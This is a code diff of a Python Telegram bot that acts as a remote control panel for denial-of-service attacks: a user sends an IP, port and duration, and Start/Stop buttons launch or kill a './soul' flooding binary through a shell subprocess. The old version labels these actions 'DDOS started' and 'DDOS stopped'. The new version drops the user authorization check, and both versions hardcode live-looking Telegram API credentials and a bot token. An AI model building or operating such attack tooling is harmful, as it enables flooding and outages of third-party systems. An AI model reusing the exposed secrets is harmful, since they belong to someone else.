@@ -1,111 +1,97 @@
-import time
-import subprocess
-import os
+import logging
 from telethon import TelegramClient, events, Button
+import subprocess
 
-USER_DATA_FILE = 'users.txt'
+# Configure logging
+logging.basicConfig(
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
 
-Apid = 22157690
-Apihash = "819a20b5347be3a190163fff29d59d81"
-tken = "7483201528:AAGLZzUEMYYN-wYmYUUwD8eVOQyiflG8-d4"
-SEMXUSER = 2092103173
+# Your bot credentials
+API_ID = 22157690
+API_HASH = "819a20b5347be3a190163fff29d59d81"
+BOT_TOKEN = "7483201528:AAGLZzUEMYYN-wYmYUUwD8eVOQyiflG8-d4"
 
-client = TelegramClient('R5O060D', Apid, Apihash).start(bot_token=tken)
+client = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-def load_users():
-    if not os.path.exists(USER_DATA_FILE):
-        return {}
+# Global variables to track the attack state
+attack_process = None
+attack_info = {}  # Store attack info
+status_message_id = None  # To keep track of the status message ID
+
+@client.on(events.NewMessage(pattern='(?P<command>\d+\.\d+\.\d+\.\d+ \d+ \d+)'))
+async def handle_attack_command(event):
+    global attack_info, status_message_id
+    command_parts = event.raw_text.split()
+    target = command_parts[0]
+    port = command_parts[1]
+    attack_time = command_parts[2]
+
+    # Store attack info in a dictionary
+    attack_info[event.chat.id] = {
+        'target': target,
+        'port': port,
+        'attack_time': attack_time
+    }
+
+    logging.info(f"Received attack command: {target}:{port} for {attack_time} seconds.")
     
-    with open(USER_DATA_FILE, 'r') as f:
-        return {int(user_id): username for user_id, username in (line.strip().split(',') for line in f)}
-
-def save_users(users):
-    with open(USER_DATA_FILE, 'w') as f:
-        for user_id, username in users.items():
-            f.write(f"{user_id},{username}\n")
-
-def is_authorized(user_id, users):
-    return user_id in users
-
-@client.on(events.NewMessage(pattern=r'.b (\S+) (\d+) (\d+)'))
-async def handle_soul(event):
-    user_id = event.sender_id
-    users = load_users()  # Reload user data
-    if not is_authorized(user_id, users):
-        await event.reply("**You are not authorized to use this command.**")
-        return
-
-    target, port, time_ = event.pattern_match.groups()
+    # Send inline buttons for start and stop
     buttons = [
-        [Button.inline("Start", data=f'start_{target}_{port}_{time_}'),
-         Button.inline("Stop", data=f'stop_{target}_{port}_{time_}')]
+        [Button.inline("Start Attack", b'start_attack'),
+         Button.inline("Stop Attack", b'stop_attack')]
     ]
-    
-    await event.reply("Control Panel:", buttons=buttons)
+    await event.respond("Choose an option:", buttons=buttons)
 
-@client.on(events.CallbackQuery(pattern=b'start_(\\S+)_(\\d+)_(\\d+)'))
-async def start_soul(event):
-    target, port, time_ = event.data.decode().split('_')[1:]
-    command = f'./soul {target} {port} {time_}'
-    
-    try:
-        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        await event.answer("DDOS started.", alert=True)
-    except Exception as e:
-        await event.answer(f"Error: {str(e)}", alert=True)
+    # Send an initial status message
+    status_message = await event.respond("Status: Idle")
+    status_message_id = status_message.id  # Store the message ID for status updates
 
-@client.on(events.CallbackQuery(pattern=b'stop_(\\S+)_(\\d+)_(\\d+)'))
-async def stop_soul(event):
-    target, port, time_ = event.data.decode().split('_')[1:]
-    command_pattern = f'./soul {target} {port} {time_}'
-    
-    try:
-        subprocess.Popen(f'pkill -f "{command_pattern}"', shell=True)
-        await event.answer("DDOS stopped.", alert=True)
-    except Exception as e:
-        await event.answer(f"Error: {str(e)}", alert=True)
+@client.on(events.CallbackQuery)
+async def handle_callback_query(event):
+    global attack_process, status_message_id
+    if event.data == b'start_attack':
+        if attack_process is None:
+            # Retrieve target, port, and attack_time from the dictionary
+            info = attack_info.get(event.chat.id)
+            if info:
+                target = info['target']
+                port = info['port']
+                attack_time = info['attack_time']
 
-@client.on(events.NewMessage(pattern='.add'))
-async def add(event):
-    if event.sender_id != SEMXUSER:
-        await event.reply("**You are not authorized to use this command.**")
-        return
-    try:
-        _, Infouser = event.message.message.split()
-        user_id = Infouser if Infouser.isdigit() else None
-        if user_id is None:
-            user = await client.get_entity(Infouser)
-            user_id = user.id
-        
-        users = load_users()  # Reload user data
-        users[user_id] = Infouser
-        save_users(users)
-        await event.reply(f"**Added {Infouser} to authorized users.**")
-    except Exception as e:
-        await event.reply(f"Error: {str(e)}")
+                # Start the attack as a subprocess
+                attack_process = subprocess.Popen(f"./soul {target} {port} {attack_time}", shell=True)
+                logging.info(f"Attack started: {target}:{port} for {attack_time} seconds.")
 
-@client.on(events.NewMessage(pattern='.remove'))
-async def remove(event):
-    if event.sender_id != SEMXUSER:
-        await event.reply("**You are not authorized to use this command.**")
-        return
-    try:
-        _, Infouser = event.message.message.split()
-        user_id = Infouser if Infouser.isdigit() else None
-        if user_id is None:
-            user = await client.get_entity(Infouser)
-            user_id = user.id
-        
-        users = load_users()  # Reload user data
-        if user_id in users:
-            del users[user_id]
-            save_users(users)
-            await event.reply(f"**Removed {Infouser} from authorized users.**")
+                # Update the status message
+                await client.edit_message(event.chat_id, status_message_id, 
+                    f"Status: Attacking {target}:{port} for {attack_time} seconds.")
+            else:
+                await event.respond("⚠️ No attack information found.")
+                logging.warning(f"No attack information found for chat ID: {event.chat.id}.")
         else:
-            await event.reply("User not found.")
-    except Exception as e:
-        await event.reply(f"Error: {str(e)}")
+            await event.respond("⚠️ Attack is already running.")
+            logging.warning("Attempted to start an attack that is already running.")
 
-client.start()
-client.run_until_disconnected()
-        
+    elif event.data == b'stop_attack':
+        if attack_process:
+            attack_process.terminate()  # Stop the attack
+            attack_process = None
+            
+            # Update the status message to show it has been stopped
+            await client.edit_message(event.chat_id, status_message_id, 
+                "Status: Attack stopped.")
+            logging.info("Attack stopped.")
+        else:
+            await client.edit_message(event.chat_id, status_message_id, 
+                "Status: No attack is currently running.")
+            logging.warning("Attempted to stop an attack that is not running.")
+
+# Start the bot
+if __name__ == "__main__":
+    logging.info("Starting the bot...")
+    client.start()
+    client.run_until_disconnected()
+    logging.info("Bot has been stopped.")
+                                      
